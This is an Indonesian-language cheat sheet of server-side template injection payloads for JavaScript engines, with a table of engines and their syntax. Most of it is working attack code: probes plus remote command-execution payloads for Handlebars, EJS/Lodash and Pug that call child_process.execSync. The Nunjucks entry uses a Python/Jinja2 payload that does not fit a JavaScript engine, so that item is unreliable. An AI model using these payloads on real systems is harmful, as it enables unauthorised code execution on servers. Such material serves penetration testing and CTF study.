# Server Side Template Injection - JavaScript

> **Server-Side Template Injection (SSTI)** adalah kerentanan di mana penyerang dapat menyisipkan kode berbahaya ke dalam template di sisi server, sehingga server dapat mengeksekusi perintah arbitrer. Pada JavaScript, SSTI bisa terjadi pada engine seperti Handlebars, EJS, Pug, dan lainnya jika input pengguna tidak disaring dengan benar.

## Ringkasan

- [Library Template Populer](#library-template-populer)
- [Payload Dasar](#payload-dasar)
- [Payload Spesifik Engine](#payload-spesifik-engine)
- [Referensi](#referensi)

## Library Template Populer

| Nama Template     | Format Payload     | Bahasa Pemrograman   |
| ----------------- | ------------------ | -------------------- |
| HandlebarsJS      | `{{ }}`            | JavaScript (Node.js) |
| EJS               | `<% %>`            | JavaScript (Node.js) |
| Pug/Jade          | `#{ }`             | JavaScript (Node.js) |
| MustacheJS        | `{{ }}`            | JavaScript (Node.js) |
| NunjucksJS        | `{{ }}`            | JavaScript (Node.js) |
| Lodash/Underscore | `<% %>` / `{{= }}` | JavaScript (Node.js) |
| DotJS             | `{{= }}`           | JavaScript (Node.js) |
| DustJS            | `{}`               | JavaScript (Node.js) |
| HoganJS           | `{{ }}`            | JavaScript (Node.js) |
| TwigJS            | `{{ }}`            | JavaScript (Node.js) |
| VelocityJS        | `#set($x="") $x`   | JavaScript (Node.js) |
| VueJS             | `{{ }}`            | JavaScript (Node.js) |

## Payload Dasar

Coba payload berikut pada input yang dicurigai:

```handlebars
{{7*7}}
<%= 7*7 %>
#{7*7}
```

Jika output menjadi `49`, kemungkinan aplikasi rentan SSTI.

## Payload Spesifik Engine

### Handlebars

- **Injeksi Dasar:**
  ```handlebars
  {{this}}
  {{7*7}}
  ```
- **Eksekusi Perintah (versi rentan):**
  > Hanya bekerja pada versi Handlebars tertentu yang rentan.
  ```handlebars
  {{#with "s" as |string|}}
    {{#with "e"}}
      {{#with split as |conslist|}}
        {{this.pop}}
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        {{#with string.split as |codelist|}}
          {{this.pop}}
          {{this.push "return require('child_process').execSync('id');"}}
          {{this.pop}}
          {{#each conslist}}
            {{#with (string.sub.apply 0 codelist)}}
              {{this}}
            {{/with}}
          {{/each}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
  ```

### EJS / Lodash / Underscore

- **Injeksi Dasar:**
  ```ejs
  <%= 7*7 %>
  ```
- **Eksekusi Perintah (jika tidak difilter):**
  ```ejs
  <%= require('child_process').execSync('id') %>
  ```

### Pug / Jade

- **Injeksi Dasar:**
  ```jade
  #{7*7}
  ```
- **Eksekusi Perintah (Node.js):**
  ```jade
  #{process.mainModule.require('child_process').execSync('id')}
  ```

### Nunjucks

- **Injeksi Dasar:**
  ```nunjucks
  {{7*7}}
  ```
- **Eksekusi Perintah (jika sandbox nonaktif):**
  ```nunjucks
  {{ cycler.__init__.__globals__.os.popen('id').read() }}
  ```

## Tips

- Selalu cek output aplikasi setelah mengirim payload.
- Gunakan variasi payload jika satu format tidak berhasil.
- Setelah engine teridentifikasi, cari dokumentasi exploitasi engine tersebut.
- Gunakan payload hanya di lingkungan legal (CTF/lab).

## Referensi

- [PayloadAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
